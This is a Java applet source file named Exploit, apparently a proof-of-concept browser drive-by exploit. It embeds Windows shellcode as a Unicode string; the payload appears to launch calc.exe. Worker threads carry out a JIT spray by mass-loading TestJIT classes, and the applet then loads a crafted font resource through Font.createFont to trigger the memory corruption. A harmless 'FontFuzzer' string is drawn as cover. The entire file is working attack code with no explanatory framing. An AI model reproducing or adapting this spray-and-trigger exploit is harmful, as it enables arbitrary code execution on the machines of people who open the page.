import java.awt.Font;
import java.awt.Graphics;
import java.awt.Graphics2D;
import java.awt.RenderingHints;

import javax.swing.JFrame;
import javax.swing.JPanel;
import java.awt.font.*;
import java.io.*;
import java.applet.*;

public class Exploit extends Applet {
    public static final String shellcode = "\u7579\u696b\u7579\u696b\ue8fc\u0089\u0000\u8960\u31e5\u64d2\u528b\u8b30\u0c52\u528b\u8b14\u2872\ub70f\u264a\uff31\uc031\u3cac\u7c61\u2c02\uc120\u0dcf\uc701\uf0e2\u5752\u528b\u8b10\u3c42\ud001\u408b\u8578\u74c0\u014a\u50d0\u488b\u8b18\u2058\ud301\u3ce3\u8b49\u8b34\ud601\uff31\uc031\uc1ac\u0dcf\uc701\ue038\uf475\u7d03\u3bf8\u247d\ue275\u8b58\u2458\ud301\u8b66\u4b0c\u588b\u011c\u8bd3\u8b04\ud001\u4489\u2424\u5b5b\u5961\u515a\ue0ff\u5f58\u8b5a\ueb12\u5d86\u016a\u858d\u00b9\u0000\u6850\u8b31\u876f\ud5ff\ue0bb\u2a1d\u680a\u95a6\u9dbd\ud5ff\u063c\u0a7c\ufb80\u75e0\ubb05\u1347\u6f72\u006a\uff53\u63d5\u6c61\u2e63\u7865\u0065";

    Thread[] workers_ = new Thread[2];
    int numToSpray_ = 60;

    public Exploit() {
        
    }

    public void paint(Graphics g) {

        Graphics2D g2 = (Graphics2D)g;
        g2.setRenderingHint(RenderingHints.KEY_ANTIALIASING,
            RenderingHints.VALUE_ANTIALIAS_ON);
        Font font ;

	spray();
	
	//try{Thread.sleep(10000);}catch(Exception ex){}
	
        try {
        	font = Font.createFont( Font.TRUETYPE_FONT, Exploit.class.getResourceAsStream("cff"));
        	font = font.deriveFont( Font.PLAIN, 60 );
        	g2.setFont(font);
    	}  catch (Exception e) {
    		e.printStackTrace();
    	}
        
	System.out.println("Draw...");
        g2.drawString("FontFuzzer", 40, 120); 
      }
      
  public void init() {
  }
	
  public void spray() {

		System.out.println( "Before Spray..." );
		
		System.out.println( "Spraying..." );

		long beginTime = System.currentTimeMillis();
    	
		
		int numSprayPerWorker = numToSpray_ / workers_.length;
		int curIndex = 0;

		for ( int i = 0; i < workers_.length; ++ i ) {

			workers_[i] = new SprayWorker(curIndex, curIndex + numSprayPerWorker);
			workers_[i].start();
			curIndex += numSprayPerWorker;
		}

		for ( int i = 0; i < workers_.length; ++ i ) {
			try { workers_[i].join(); } catch (Exception e) {e.printStackTrace();}
		}

		//try{Thread.sleep(10000);}catch(Exception e){}
		
		System.out.println( "After Spray..." );

		System.out.println( "Spray time: " + (System.currentTimeMillis() - beginTime) + " milliseconds." );
		
		
	}

  public static class SprayWorker extends Thread {
		int startIndex_;
		int endIndex_;
		Object[] instances_;

		public SprayWorker(int startIndex, int endIndex) {
			startIndex_ = startIndex;
			endIndex_ = endIndex;
		}

		public void run() {
			spray();
		}

		public void spray() {

			instances_ = new Object[endIndex_ - startIndex_];
			
			for ( int i = startIndex_, j = 0; i < endIndex_; ++ i, ++ j ) {
				String classname = String.format( "TestJIT%06d", i );
				try {
					instances_[j] = this.getClass().getClassLoader().loadClass( classname ).newInstance();
					
					if ( j % 100 == 0 ) {
						System.out.println( "Thread " + this.getId() + " Loaded " + j + " classes ..." );
					}
					
				} catch ( Exception ex ) {
					ex.printStackTrace();
				}
			}
			
			
			System.out.println( "Thread " + this.getId() + " finished spray." );
		
		
		}
	}

}